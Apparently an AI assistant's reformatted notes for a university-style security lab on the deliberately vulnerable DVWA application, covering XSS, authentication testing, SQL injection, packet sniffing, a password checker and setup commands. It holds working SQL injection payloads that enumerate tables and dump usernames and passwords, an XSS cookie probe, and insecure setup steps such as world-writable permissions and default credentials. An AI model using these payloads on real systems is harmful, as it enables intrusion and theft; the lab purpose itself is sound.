@@ -1,0 +1,207 @@
+I will rewrite everything exactly as you provided, removing `*` and `#` symbols that are not part of actual code, and placing every command/code on a separate line so you can copy easily.
+
+────────────────────────────
+
+1. XSS Vulnerabilities
+   ────────────────────────────
+
+Phase 1: Environment Setup
+
+Start Services:
+
+sudo service apache2 start
+sudo service mysql start
+
+Access DVWA:
+[http://localhost/dvwa](http://localhost/dvwa)
+
+Login Credentials:
+Username: admin
+Password: password
+
+────────────────────────────
+Phase 5: Session Cookie Theft Script
+────────────────────────────
+
+<script>alert(document.cookie)</script>  
+
+────────────────────────────
+2) Testing Authentication Weaknesses and Session Management
+────────────────────────────
+
+Start Services:
+
+sudo service apache2 start
+sudo service mysql start
+
+Access DVWA:
+[http://127.0.0.1/dvwa](http://127.0.0.1/dvwa)
+
+Protected URL for testing logout:
+
+[http://127.0.0.1/dvwa/vulnerabilities/brute/](http://127.0.0.1/dvwa/vulnerabilities/brute/)
+
+────────────────────────────
+3) SQL Injection Attack
+────────────────────────────
+
+Install DVWA:
+
+sudo apt update
+sudo apt install dvwa -y
+
+Start Services:
+
+sudo service apache2 start
+sudo service mysql start
+
+Edit Config File:
+
+sudo nano /etc/dvwa/config.inc.php
+
+Open DVWA:
+
+[http://127.0.0.1/dvwa](http://127.0.0.1/dvwa)
+
+SQL Injection Payloads:
+
+1
+
+1' OR '1'='1
+
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+1' UNION SELECT 1,2-- -
+
+1' UNION SELECT database(),2-- -
+
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+1' UNION SELECT user,password FROM users-- -
+
+────────────────────────────
+4) Packet Sniffing and Network Traffic Analysis
+────────────────────────────
+
+Start Local HTTP Server:
+
+python3 -m http.server 8080
+
+Start Packet Capture:
+
+sudo tcpdump -i any -w capture.pcap port 8080
+
+Open in Browser:
+
+[http://localhost:8080](http://localhost:8080)
+
+Wireshark Filter:
+
+http.request.method == "POST"
+
+────────────────────────────
+5) Password Strength Checker (Python Code)
+────────────────────────────
+
+```python
+import re
+
+def check_password_strength(password):
+    strength = 0
+    remarks = ""
+
+    if len(password) >= 8:
+        strength += 1
+    else:
+        remarks = "Too Short"
+
+    if re.search(r'[A-Z]', password):
+        strength += 1
+
+    if re.search(r'[a-z]', password):
+        strength += 1
+
+    if re.search(r'[0-9]', password):
+        strength += 1
+
+    if re.search(r'[@$%^&+=!]', password):
+        strength += 1
+
+    if strength == 5:
+        return "Strong Password"
+    elif 3 <= strength < 5:
+        return "Medium Password"
+    else:
+        return f"Weak Password ({remarks})"
+
+pwd = input("Enter a password to test: ")
+print(f"Result: {check_password_strength(pwd)}")
+```
+
+────────────────────────────
+6) DVWA Login Setup (Full Commands Cleaned)
+────────────────────────────
+
+Navigate to Web Directory:
+
+cd /var/www/html
+
+Clone Repository:
+
+sudo git clone [https://github.com/digininja/DVWA.git](https://github.com/digininja/DVWA.git)
+
+Set Permissions:
+
+sudo chmod -R 777 dvwa
+
+Go to Config Directory:
+
+cd dvwa/config
+
+Copy Config File:
+
+cp config.inc.php.dist config.inc.php
+
+Edit Config File:
+
+sudo mousepad config.inc.php
+
+Start MySQL:
+
+sudo systemctl start mysql
+
+Login to MySQL:
+
+sudo mysql -u root -p
+
+MySQL Commands:
+
+CREATE DATABASE dvwa;
+CREATE USER 'admin'@'127.0.0.1' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON dvwa.* TO 'admin'@'127.0.0.1';
+FLUSH PRIVILEGES;
+EXIT;
+
+Start Apache:
+
+sudo systemctl start apache2
+
+Edit PHP Configuration (Adjust version if needed):
+
+sudo mousepad /etc/php/8.2/apache2/php.ini
+
+Restart Apache:
+
+sudo systemctl restart apache2
+
+Open DVWA in Browser:
+
+[http://127.0.0.1/dvwa](http://127.0.0.1/dvwa)
+
+────────────────────────────
+
+If you want, I can also format this as a clean lab record (ready to submit PDF format) with Aim, Procedure, Result, and Conclusion.
